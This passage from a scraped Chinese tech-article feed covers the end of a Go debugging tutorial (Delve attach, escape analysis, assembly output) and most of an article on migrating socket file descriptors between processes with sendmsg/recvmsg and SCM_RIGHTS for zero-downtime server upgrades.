data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe7yLibnOW7FxE8FdgDgMGlCcmhIXyPnt59IBbMeaqgkx4JNWglAgJpLA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.5601851851851852&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeTmA1oqAump1NREGckhHXwZ5NWTj8xetTnxwM1VWlNBXWvEeIianrgSA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h3 data-line=&quot;1734&quot;&gt;&lt;span&gt;9.3.2 Web服务场景&lt;/span&gt;&lt;/h3&gt;&lt;p data-line=&quot;1736&quot;&gt;&lt;span&gt;还是这个demo&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1737&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;// 启动web服务&lt;/span&gt;&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;找到服务进程ID &lt;/span&gt;&lt;code&gt;&lt;span&gt;lsof -i :8080&lt;/span&gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;dlv调试进程 &lt;/span&gt;&lt;code&gt;&lt;span&gt;dlv attach 36968&lt;/span&gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;进入调试模式，调试代码（和上面一样）&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-line=&quot;1766&quot;&gt;&lt;span&gt;9.4(扩展) 逃逸分析&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1768&quot;&gt;&lt;p data-line=&quot;1768&quot;&gt;&lt;span&gt;逃逸分析命令：go build -gcflags &quot;-m -l&quot; *.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1770&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Demo &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;DemoFun()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;DemoFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; *&lt;span&gt;Demo&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demo := &amp;amp;Demo{}&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; demo&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// # command-line-arguments&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ./main.go:11:10: &amp;amp;Demo literal escapes to heap &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; 局部变量内存被分配到堆上&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1789&quot;&gt;&lt;span&gt;9.5(扩展) 汇编代码&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1791&quot;&gt;&lt;p data-line=&quot;1791&quot;&gt;&lt;span&gt;直接生成汇编代码命令：&lt;/span&gt;&lt;span&gt;go run -gcflags -S main.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1793&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;# command-line-arguments&lt;br/&gt;&quot;&quot;.main STEXT nosplit size=1 args=0x0 locals=0x0&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  TEXT    &quot;&quot;.main(SB), NOSPLIT|ABIInternal, $0-0&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  FUNCDATA        $0, gclocals·33cdeccccebe80329f1fdbee7f5874cb(SB)&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  FUNCDATA        $1, gclocals·33cdeccccebe80329f1fdbee7f5874cb(SB)&lt;br/&gt;        0x0000 00000 (.../demo/main.go:6)  FUNCDATA        $2, gclocals·33cdeccccebe80329f1fdbee7f5874cb(SB)&lt;br/&gt;        0x0000 00000 (&amp;lt;unknown line number&amp;gt;)    RET&lt;br/&gt;        0x0000 c3       &lt;br/&gt;略......&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;1805&quot;&gt;&lt;p data-line=&quot;1805&quot;&gt;&lt;span&gt;获取生成汇编代码整个优化过程：&lt;/span&gt;&lt;span&gt;GOSSAFUNC=main go build main.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1808&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;dumped SSA to ./ssa.html &amp;lt;------- 生成的文件，浏览器打开此文件&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-croporisrc=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeH09lTQfX5PVUocYSh4Y8JYQKcT7KORQqWMMSIrshGPuiaBbzvHQDJJg/640?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;1080&quot; data-cropy1=&quot;0&quot; data-cropy2=&quot;325.924276169265&quot; data-ratio=&quot;0.30092592592592593&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeJKE70dEYloiawV9T8WfYhTNaKc6vd4yFkFfWgKqiauw2uKm04IKibqG0A/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;Go轻松进阶系列&lt;/span&gt;&lt;/strong&gt;&lt;span&gt; 更多文章&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;1&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/TiccVmMZ3icdgDGUicDlY5kWW5P7CL4n2Uf7xYPLAEo3zFQxsYSDeHbticPicM8eJnZia0HM6pFhFK0rVmKKX0X4CbBg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages&quot; data-ratio=&quot;0.06302521008403361&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdjOmxkheVnwCeibLWia2yTSSAnu4wH1RgmdCrGrIicz5oicSN5gbZxKaiaZ3oicxDC3iaOCm92d2VjbqGMmw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;714&quot;/&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-tools-id=&quot;36694&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;img data-ratio=&quot;1.375&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_gif/TiccVmMZ3icdiazAwOwey9wAIliamDeGicTOXib4HFynOX3BUxJMO7b4Azq3fNx3JgEwKU3NMG3N2hLLfIsqCUJMd43w/640?wx_fmt=gif&quot; data-type=&quot;gif&quot; data-w=&quot;40&quot;/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span/&gt;&lt;/p&gt;
                &lt;/div&gt;

                

                



                
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>1a0eb615b29ee31c5457a6f228090296</guid>
<title>黑科技解密！实现 Socket 进程间迁移</title>
<link>https://toutiao.io/k/wzbyfev</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages&quot; data-backh=&quot;174&quot; data-backw=&quot;365&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.4767123287671233&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_gif/cvQbJDZsKLp6wejHtKTRbqqQyt0wMk9K1wNtuwRqQTJAPOJ1KiaqSeSRbIJRTicVicKpDKRndBodY2DBNN20tvWwA/640?wx_fmt=gif&quot; data-type=&quot;gif&quot; data-w=&quot;365&quot;/&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;原创：小姐姐味道（微信公众号ID：xjjdog），欢迎分享，转载请保留出处。&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天介绍一个可以拿出去吹牛的功能：实现socket句柄在进程之间迁移！为了这篇文章，xjjdog可算下了苦功夫，半夜还在翻资料。因为需要验证后，才能证明这项技术确实是正确的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;正文。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们的服务器上，运行着大量的server实例（instance）。这些instance，每个都要承载着数十万的连接和非常繁忙的网络请求。能够把这样的连接数，这样的流量，玩弄于股掌之间，是每个互联网程序员的梦想。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;但软件总是要升级的，每当升级的时候，就需要先停掉原来的instance，然后再启动一个新的。在这一停一起之间，数十秒就过去了，更不要说JAVA这种启动时间就能生个孩子的速度了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;传统的做法，是先把这个instance从负载均衡上面摘除，然后启动起来再加上；对于微服务来说，就要先隔离，然后启动后再取消隔离。这些操作，对于海量应用来说，就是个噩梦。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;1. 零停机更新&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有没有一种方法，能够把一个进程所挂载的连接（socket），转移到另外一个进程之上呢？这样，我在升级的时候，就可可以先启动一个升级版本的进程，然后把老进程的socket，one by one的给转移过去。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;实现零停机更新。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个是可以的。Facebook就实践过类似的技术，它们把这项技术，叫做&lt;code&gt;Socket Takeover&lt;/code&gt;。千万别用百度搜这个关键字，你得到的可能是一堆垃圾。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这么牛x的技术，还这么有用，为什么就没人科普呢？别问我，我也不知道，可能大家现在都在纠结怎么研究茴香豆的茴字写法，没时间干正事吧。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那今天就由&lt;code&gt;xjjdog&lt;/code&gt;来介绍一下吧，顺便增加一下大家以后的吹牛资本。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个牛x的功能，是由Linux一对底层的&lt;code&gt;系统调用&lt;/code&gt;函数所实现的：&lt;code&gt;sendmsg()&lt;/code&gt;和&lt;code&gt;recvmsg()&lt;/code&gt;。我们一般在发送网络数据包的时候，一般会使用send函数，但send函数只有在socket处于连接状态时才可以使用；与之不同的是，sendmsg在任何时候都可以使用。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;2. 技术要点&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在c语言网络编程中，首先要通过&lt;code&gt;listen&lt;/code&gt;函数，来注册监听地址，然后再用accept函数接收新连接。比如：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&lt;span&gt;int&lt;/span&gt; listen_fd = socket(addr-&amp;gt;ss_family, SOCK_STREAM, &lt;span&gt;0&lt;/span&gt;);&lt;br/&gt;...&lt;br/&gt;bind(listen_fd, (struct sockaddr *) addr, addrlen);&lt;br/&gt;...&lt;br/&gt;&lt;span&gt;int&lt;/span&gt; accept_fd = accept(fd, (struct sockaddr *) &amp;amp;addr, &amp;amp;addrlen);&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们首先要做的，就是把&lt;code&gt;listen_fd&lt;/code&gt;，从一个进程，传递到另外一个进程中去。怎么发送呢？肯定是要通过一个通道的。在Linux上，那就是UDS，全称&lt;code&gt;Unix Domain Sockets&lt;/code&gt;。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;2.1 Unix Domain Sockets监听&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;UDS（Unix Domain Sockets）在Linux上的表现，是一个文件。相比较于普通socket监听在端口上，一个进程也可以监听在一个UDS文件上，比如&lt;code&gt;/tmp/xjjdog.sock&lt;/code&gt;。由于通过这个文件进行数据传输，并不需要走网卡等物理设备，所以通过UDS传输数据，速度是非常快的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;但今天我们不关心它有多块，而是关心它多有用。通过bind函数，我们同样可以通过这个文件接收连接，就像端口接收连接一样。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt; &lt;span&gt;sockaddr_un&lt;/span&gt; &lt;span&gt;addr&lt;/span&gt;;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;char&lt;/span&gt; *path=&lt;span&gt;&quot;/tmp/xjjdog.sock&quot;&lt;/span&gt;;&lt;br/&gt;&lt;span&gt;int&lt;/span&gt; err, fd;&lt;br/&gt;fd = socket(AF_UNIX, SOCK_STREAM, &lt;span&gt;0&lt;/span&gt;);&lt;br/&gt;&lt;span&gt;memset&lt;/span&gt;(&amp;amp;addr, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;sizeof&lt;/span&gt;(struct sockaddr_un));&lt;br/&gt;addr.sun_family = AF_UNIX;&lt;br/&gt;&lt;span&gt;strncpy&lt;/span&gt;(addr.sun_path, path, &lt;span&gt;strlen&lt;/span&gt;(path));&lt;br/&gt;addrlen = &lt;span&gt;sizeof&lt;/span&gt;(addr.sun_family) + &lt;span&gt;strlen&lt;/span&gt;(path);&lt;br/&gt;err = bind(fd, (struct sockaddr *) &amp;amp;addr, addrlen);&lt;br/&gt;...&lt;br/&gt;accept_fd = accept(fd, (struct sockaddr *) &amp;amp;addr, &amp;amp;addrlen);&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-ratio=&quot;0.8207792207792208&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/cvQbJDZsKLqWhqV31WIGTp3IkKeOXQV4rDnf4DMwhfxPKwwNHA5jfFDWxqAHiaqlqADHeI6aJTx2g1Q9DKNhvPA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;385&quot;/&gt;&lt;/p&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样。其他的进程，就可以通过两种不同的方式，来连接我们的服务。&lt;/p&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;通过端口：进行正常的服务，输出正常的业务数据。执行正常业务&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;通过UDS：开始接收&lt;code&gt;listen_fd&lt;/code&gt;和&lt;code&gt;accept_fd&lt;/code&gt;们。执行不停机迁移socket业务&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;2.2 fd迁移技术要点&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;怎么迁移呢？我们关键看第二步。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;实际上，当新升级的服务通过UDS连接上来，我们就开始使用sendmsg函数，将&lt;code&gt;listen_fd&lt;/code&gt;给转移过去。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们来看一下sendmsg这个函数的参数。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;ssize_t&lt;/span&gt; &lt;span&gt;sendmsg&lt;/span&gt;&lt;span&gt;(&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt; socket,&lt;br/&gt;    &lt;span&gt;const&lt;/span&gt; struct msghdr *message,&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt; flags&lt;br/&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;socket可以理解为我们的UDS连接。关键在于&lt;code&gt;msghdr&lt;/code&gt;这个结构体。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt; &lt;span&gt;msghdr&lt;/span&gt; {&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;void&lt;/span&gt;            *msg_name;      &lt;span&gt;/* optional address */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;socklen_t&lt;/span&gt;       msg_namelen;    &lt;span&gt;/* size of address */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;struct&lt;/span&gt;          &lt;span&gt;iovec&lt;/span&gt; *&lt;span&gt;msg_iov&lt;/span&gt;;&lt;/span&gt; &lt;span&gt;/* scatter/gather array */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt;             msg_iovlen;     &lt;span&gt;/* # elements in msg_iov */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;void&lt;/span&gt;            *msg_control;   &lt;span&gt;/* ancillary data, see below */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;socklen_t&lt;/span&gt;       msg_controllen; &lt;span&gt;/* ancillary data buffer len */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt;             msg_flags;      &lt;span&gt;/* flags on received message */&lt;/span&gt;&lt;br/&gt;};&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其中， &lt;code&gt;msg_iov&lt;/code&gt;表示要正常发送的数据，比如&lt;code&gt;HelloWord&lt;/code&gt;；除此之外，还有两个&lt;code&gt;ancillary&lt;/code&gt; (附属的) 的变量，提供了附加的功能，那就是变量&lt;code&gt;msg_control&lt;/code&gt;和&lt;code&gt;msg_controllen&lt;/code&gt;。其中，&lt;code&gt;msg_control&lt;/code&gt;又指向了另外一个结构体&lt;code&gt;cmsghdr&lt;/code&gt;。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt; &lt;span&gt;cmsghdr&lt;/span&gt; {&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;socklen_t&lt;/span&gt; cmsg_len;    &lt;span&gt;/* data byte count, including header */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt;       cmsg_level;  &lt;span&gt;/* originating protocol */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt;       cmsg_type;   &lt;span&gt;/* protocol-specific type */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;/* followed by */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;unsigned&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; cmsg_data[];&lt;br/&gt;};&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在这个结构体中，有一个叫做&lt;code&gt;cmsg_type&lt;/code&gt;的成员变量，是我们实现socket迁移的关键。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;它共有三个类型。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;SCM_RIGHTS&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;SCM_CREDENTIALS&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;SCM_SECURITY&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其中，&lt;code&gt;SCM_RIGHTS&lt;/code&gt;就是我们所需要的，它允许我们从一个进程，发送一个文件句柄到另外一个进程。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-ratio=&quot;0.5135566188197768&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/cvQbJDZsKLqWhqV31WIGTp3IkKeOXQV47ojcFZ4sv0ic4ib8svdJniafVSWkE2aFuqpDpX6NFicG9FzT4NrhL4cmPg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;627&quot;/&gt;&lt;/p&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt; &lt;span&gt;msghdr&lt;/span&gt; &lt;span&gt;msg&lt;/span&gt;;&lt;/span&gt;&lt;br/&gt;...&lt;br/&gt;&lt;span&gt;&lt;span&gt;struct&lt;/span&gt; &lt;span&gt;cmsghdr&lt;/span&gt; *&lt;span&gt;cmsg&lt;/span&gt; = &lt;span&gt;CMSG_FIRSTHDR&lt;/span&gt;(&amp;amp;&lt;span&gt;msg&lt;/span&gt;);&lt;/span&gt;&lt;br/&gt;cmsg-&amp;gt;cmsg_level = SOL_SOCKET;&lt;br/&gt;cmsg-&amp;gt;cmsg_type = SCM_RIGHTS;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//socket fd列表，设置在cmsg_data上&lt;/span&gt;&lt;br/&gt;&lt;span&gt;int&lt;/span&gt; *fds = (&lt;span&gt;int&lt;/span&gt; *) CMSG_DATA(cmsg);&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;依靠&lt;code&gt;sendmsg&lt;/code&gt;函数，socket句柄就发送到另外一个进程了。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;3. 接收和还原&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;同样的，&lt;code&gt;recvmsg&lt;/code&gt;函数，将会接收这部分数据，然后将其还原成&lt;code&gt;cmsghdr&lt;/code&gt;结构体。然后我们就可以从&lt;code&gt;cmsg_data&lt;/code&gt;中获取句柄列表。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;为什么能这么做呢？因为socket句柄，在某个进程里，其实只是一个引用。真正的fd句柄，其实是放在内核中的。所谓的迁移，只不过是把一个指针，从一个进程中去掉，再加到另外一个进程中罢了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;fd句柄的属性，有两种情况。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;监听fd，直接调用&lt;code&gt;accept&lt;/code&gt;函数作用在fd上即可&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;普通fd，需要将其还原成正常的socket&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-ratio=&quot;0.683206106870229&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/cvQbJDZsKLqWhqV31WIGTp3IkKeOXQV4sF3JZRe7ayBZq3sqj1Hic3b5ZorSh4xFxLF1dPvrfzCKZcP7sQzZiaLw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;524&quot;/&gt;&lt;/p&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;图片来自论文：(Zero Downtime Release: Disruption-free Load Balancing of a Multi-Billion User Website)&lt;/span&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于普通fd，肯定要调用与原新连接到来时&lt;code&gt;相同的&lt;/code&gt;代码逻辑。所以，一个大体的迁移过程，包括：&lt;/p&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;首先迁移listener fd到新进程，并开启监听，以便新进程能快速接收新的请求。如果我们开启了&lt;code&gt;SO_REUSEADDR&lt;/code&gt;选项，新老服务甚至能够一起进行服务&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;等待新进程预热之后，停掉原进程的监听&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;迁移原老进程中的大量socket，这些socket可能有数万条，最好编码能看到迁移进度&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;新进程接收到这些socket，陆续将其还原为正常的连接。相当于略过了accept阶段，直接就获取了socket列表&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;迁移完毕，老进程就空转了，此时可以安全的停掉&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4. End&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这是一项黑科技，其实已经在一些主流的应用中使用了。你会看到一些非常眼熟的软件，这项功能是它们的一大卖点。比如&lt;code&gt;HAProxy&lt;/code&gt;，运行在4层网络的负载均衡；比如&lt;code&gt;Envoy&lt;/code&gt;，Istio默认的数据平面软件，使用类似的技术完成热重启。&lt;/p&gt;&lt;p 